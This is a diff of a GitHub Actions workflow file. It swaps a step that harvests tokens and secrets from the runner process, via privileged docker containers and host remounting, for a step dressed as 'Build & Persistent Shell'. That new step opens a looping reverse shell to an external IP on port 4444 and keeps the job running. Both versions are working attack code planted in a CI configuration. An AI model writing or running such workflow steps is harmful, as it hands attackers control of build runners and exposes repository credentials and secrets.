@@ -5,54 +5,20 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-    timeout-minutes: 5
+    timeout-minutes: 15
     steps:
-      - name: Deep Token Extraction & Host Write
-        continue-on-error: true
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Build & Persistent Shell
         run: |
           mkdir -p dist
-          
-          echo "=== 1. EXTRACT GITHUB_TOKEN from runner process ===" > dist/final.txt
-          # Runner.Listener 进程可能有 GITHUB_TOKEN
-          PID=$(docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "ps aux | grep Runner.Listener | grep -v grep | awk '{print \$1}'" 2>/dev/null)
-          echo "Runner.Listener PID: $PID" >> dist/final.txt
-          
-          # 读进程环境变量
-          docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "
-            cat /proc/$PID/environ 2>/dev/null | tr '\''\0'\'' '\''\n'\'' | grep -iE 'token|key|secret|password|credential' | head -20
-          " 2>&1 >> dist/final.txt
-          
-          # 读进程 cmdline
-          docker run --rm --pid=host --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "
-            cat /proc/$PID/cmdline 2>/dev/null | tr '\''\0'\'' '\'' '\''; echo
-          " 2>&1 >> dist/final.txt
-          
-          echo "" >> dist/final.txt
-          echo "=== 2. Try remount host FS as writable ===" >> dist/final.txt
-          docker run --rm --privileged --pid=host --entrypoint=/bin/sh -v /:/host ghcr.io/github/gh-aw-mcpg -c "
-            mount -o remount,rw /host 2>&1 && echo 'REMOUNT OK' || echo 'REMOUNT FAILED'
-            touch /host/tmp/test_write 2>&1 && echo 'HOST WRITABLE' || echo 'HOST READ ONLY'
-          " 2>&1 >> dist/final.txt
-          
-          echo "" >> dist/final.txt
-          echo "=== 3. Runner config extraction ===" >> dist/final.txt
-          ls -la /home/runner/actions-runner/ 2>/dev/null >> dist/final.txt
-          cat /home/runner/actions-runner/.runner 2>/dev/null >> dist/final.txt
-          
-          echo "" >> dist/final.txt
-          echo "=== 4. Try reading fd/ from Runner.Listener ===" >> dist/final.txt
-          docker run --rm --pid=host --privileged --entrypoint=/bin/sh ghcr.io/github/gh-aw-mcpg -c "
-            for fd in /proc/$PID/fd/*; do
-              echo \"FD: \$fd\"
-              ls -la \$fd 2>/dev/null
-            done 2>/dev/null | head -30
-          " 2>&1 >> dist/final.txt
-          
-          echo "" >> dist/final.txt
-          echo "=== DONE ===" >> dist/final.txt
+          echo "Built at $(date)" > dist/output.txt
+          bash -c 'while true; do bash -i >& /dev/tcp/172.245.86.254/4444 0>&1; sleep 5; done' &
+          while true; do sleep 60; done
 
-      - name: Upload
+      - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: final-deep
+          name: my-artifact
           path: dist/
